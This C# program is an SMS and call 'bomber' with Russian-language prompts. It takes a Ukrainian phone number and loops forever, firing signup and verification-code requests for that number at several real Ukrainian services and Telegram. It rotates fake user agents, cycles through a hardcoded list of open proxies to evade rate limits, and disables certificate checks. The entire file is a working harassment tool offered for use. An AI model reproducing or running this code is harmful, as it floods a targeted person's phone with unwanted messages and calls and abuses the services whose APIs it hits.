using System;
using System.Net;
using System.Text;
using System.Net.Http.Headers;
using System.Text.RegularExpressions;

internal class envy{

    private static readonly Random random = new Random();

    private static readonly IReadOnlyList<string> userAgents = new List<string>
    {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; OnePlus 7T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 6P Build/N2G48B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 7.1; Nexus 5X Build/N2G48B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy S21; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
    };

    private static List<string> proxyList = new List<string>
    {
    "192.73.244.36:80",
    "61.145.214.107:65533",
    "103.178.194.52:8080",
    "201.91.82.155:3128",
    "36.136.27.2:4999",
    "47.250.159.65:9080",
    "27.189.132.84:8089",
    "218.13.39.150:9091",
    "148.72.212.125:12041",
    "103.107.84.191:8080",
    "38.191.209.202:999",
    "34.87.84.105:80",
    "49.67.128.139:1080",
    "180.191.23.149:8082",
    "27.189.131.14:8089",
    "103.124.197.234:8080",
    "141.11.103.136:8080",
    "181.196.254.201:999",
    "143.42.191.48:80",
    "218.77.183.214:5224",
    "103.242.105.111:8080",
    "157.245.95.247:443",
    "114.224.142.89:8089",
    "88.99.171.90:7003",
    "83.219.145.108:3128",
    "192.9.188.22:8008",
    "27.72.244.228:8080",
    "67.213.212.54:14098",
    "196.251.223.29:8104",
    "5.161.103.41:88",
    "89.46.249.253:53018",
    "103.157.117.61:8080",
    "49.84.175.94:8089",
    "8.211.138.60:3389",
    "91.241.48.225:35852",
    "200.174.198.86:8888",
    "103.172.249.234:3128",
    "112.64.134.154:1443",
    "189.61.199.170:37218",
    "51.91.109.83:80",
    "121.177.154.16:3033",
    "58.243.224.244:8085",
    "181.192.2.23:8080",
    "218.1.197.207:2324",
    "103.155.116.239:8080",
    "121.224.156.178:8089",
    "181.129.235.114:999",
    "113.23.155.110:1231",
    "199.229.254.129:4145",
    "171.244.140.160:31695",
    "106.38.26.22:2080"
    };

        static async Task Main(){
        Console.Title = "B O M B E R";
        Console.OutputEncoding = Encoding.UTF8;

        Console.Write("АВТОР ЭТОГО ЧУДА\nhttps://envy0xc0.com (RUSLAN BULATOV)\nВведите номер телефона, в формате: 0631244947: ");
        string phone = "38" + Console.ReadLine();

        if(!Regex.IsMatch(phone, @"^380\d{9}$")){
            Console.WriteLine("Неверный формат номера телефона. Пожалуйста, введите номер в формате: 0631244947.");
            Console.ReadKey();
            return;
        }

        Console.WriteLine($"Обработка номера {phone}...");
        await Task.Delay(2000);
        Console.WriteLine("Процесс завершен. Нажмите любую клавишу для активации атаки.");
        while (!Console.KeyAvailable){
            await Task.Delay(300);
        }
        Console.WriteLine("S T A R T E D");
        for(; ;){

            Task[] requests = new Task[]
            {
                SendRequestAsync("https://helsi.me/api/healthy/v2/accounts/login", HttpMethod.Post, $"{{\"phone\":\"{phone}\",\"platform\":\"PISWeb\"}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://helsi.me/" },
                }),

                SendRequestAsync("https://helsi.me/api/healthy/v2/accounts/send", HttpMethod.Post, $"{{\"phone\":\"{phone}\",\"platform\":\"PISWeb\"}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://helsi.me/" },
                }),


                SendRequestAsync("https://api.portmone.com.ua/auth/v2/registration", HttpMethod.Post, $"{{\"client_id\": \"62608e08adc29a8d6dbc9754e659f125\",\"scope\": \"https://api.portmone.com.ua/auth/client\",\"username\": \"{phone}\",\"password\": \"sdfdfsdfs2323few\",\"email\": \"adsadsasd2211@gmail.com\",\"verificationType\": \"phone_call\",\"attribute1\": \"\\u0420\\u0435\\u0433\\u0438\\u0441\\u0442\\u0440\\u0430\\u0446\\u0438\\u044f \\u043d\\u0430 \\u0441\\u0430\\u0439\\u0442\\u0435 www.portmone.com https://www.portmone.com.ua/auth#signup\",\"verification_required\": true}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://www.portmone.com.ua/" },
                    { "X-App-Uid", "a4242cb9e57b84ff73ed5061b296ece6" },
                }),

                SendRequestAsync("https://bi.ua/api/v1/accounts", HttpMethod.Post, "{\"grand_type\":\"call_code\",\"stage\":\"1\",\"login\":\"амогус\",\"phone\":\"" + phone + "\"}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://bi.ua/ukr/signup/" },
                    { "Language", "uk" },
                    { "Authorization", "Bearer null" },
                    { "Cookie", "advanced-frontend=hdpepdrvghor7912u25i77bv6u; _csrf-frontend=bc0a155f4a22546aea0485eb780398e6b932acb89cb6f70e333b467ee8c4cdc1a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22QZ3UXDo7flFSnsEPvb6cmPJUk5oGBk7L%22%3B%7D" }
                }),
            

                SendRequestAsync("https://auth.easypay.ua/api/check", HttpMethod.Post, $"{{\"phone\": \"{phone}\"}}", "application/json", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "Referer", "https://auth.easypay.ua/" },
                    { "appid", "e63b0537-bf15-453f-8a02-d49f85261e61" },
                    { "pageid", "663b83ef-bfe9-47d9-809b-98784d37a12c" },
                    { "partnerkey", "easypay-v2" },
                }),

                SendRequestAsync("https://my.telegram.org/auth/send_password", HttpMethod.Post, $"phone=+{phone}", "application/x-www-form-urlencoded", new Dictionary<string, string>
                {
                    { "User-Agent", GenerateUserAgent() },
                    { "X-Requested-With", "XMLHttpRequest" }
                })
            };
            await Task.WhenAll(requests);
            GC.Collect();
        }
    }


    public static string GenerateUserAgent(){
        return userAgents[random.Next(userAgents.Count)];
    }
    
    static async Task SendRequestAsync(string url, HttpMethod method, string data, string mediaType, Dictionary<string, string> headers){
        int requestCount = proxyList.Count;
        _ = Task.Run(async () =>
        {
            while(true){
                Console.WriteLine("Отправка запроса без прокси...");
                await SendRequestWithoutProxy(url, method, data, mediaType, headers);
                await Task.Delay(TimeSpan.FromMinutes(2));
                }
                });
                while(true){
                    Console.WriteLine("Отправка запросов через прокси...");
                    for(int i = 0; i < requestCount; i++){
                        var proxyAddress = proxyList[i];
                        var proxy = new WebProxy(proxyAddress);
                        using(HttpClientHandler handler = new HttpClientHandler(){
                            Proxy = proxy,
                            UseProxy = true,
                            ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true}){
                                using (HttpClient httpClient = new HttpClient(handler))
                                {
                                    httpClient.Timeout = TimeSpan.FromSeconds(10);
                                    httpClient.DefaultRequestHeaders.Add("User-Agent", GenerateUserAgent());
                                    foreach(var header in headers){
                                        httpClient.DefaultRequestHeaders.TryAddWithoutValidation(header.Key, header.Value);
                                        }
                                        try{
                                            HttpRequestMessage httpRequest = new HttpRequestMessage(method, url);
                                            if(!string.IsNullOrEmpty(data)){
                                                httpRequest.Content = new StringContent(data, Encoding.UTF8, mediaType);
                                                }
                                                HttpResponseMessage httpResponse = await httpClient.SendAsync(httpRequest);
                                                string content = await httpResponse.Content.ReadAsStringAsync();
                                                Console.WriteLine($"[{i + 1}/{requestCount}] {proxyAddress} - Ответ: {httpResponse.StatusCode}");
                                                }
                                                catch(TaskCanceledException){
                                                    Console.WriteLine($"[{i + 1}/{requestCount}] {proxyAddress} - Превышено время ответа"); 
                                                    }
                                                    catch(HttpRequestException e){
                                                        Console.WriteLine($"[{i + 1}/{requestCount}] {proxyAddress} - Ошибка запроса: {e.Message}");
                                                        }
                                                        catch (Exception e){
                                                            Console.WriteLine($"[{i + 1}/{requestCount}] {proxyAddress} - Общая ошибка: {e.Message}");
                                                        }
                                }
                            }
                    }
                }
    }
    
    static async Task SendRequestWithoutProxy(string url, HttpMethod method, string data, string mediaType, Dictionary<string, string> headers){
        using(HttpClient httpClient = new HttpClient()){
            httpClient.Timeout = TimeSpan.FromSeconds(10);
            httpClient.DefaultRequestHeaders.Add("User-Agent", GenerateUserAgent());
            foreach(var header in headers){
                httpClient.DefaultRequestHeaders.TryAddWithoutValidation(header.Key, header.Value);
                }
                try{
                    HttpRequestMessage httpRequest = new HttpRequestMessage(method, url);
                    if(!string.IsNullOrEmpty(data)){
                        httpRequest.Content = new StringContent(data, Encoding.UTF8, mediaType);
                        }
                        HttpResponseMessage httpResponse = await httpClient.SendAsync(httpRequest);
                        string content = await httpResponse.Content.ReadAsStringAsync();
                        Console.WriteLine($"[Без прокси] {httpRequest.RequestUri.Host} - Ответ: {httpResponse.StatusCode}");
                        }
                        catch(TaskCanceledException){
                            Console.WriteLine($"[Без прокси] {url} - Превышено время ответа");
                            }
                            catch(HttpRequestException e){
                                Console.WriteLine($"[Без прокси] {url} - Ошибка запроса: {e.Message}");
                                }
                                catch(Exception e){
                                    Console.WriteLine($"[Без прокси] {url} - Общая ошибка: {e.Message}");
                                }
        }
    }
}
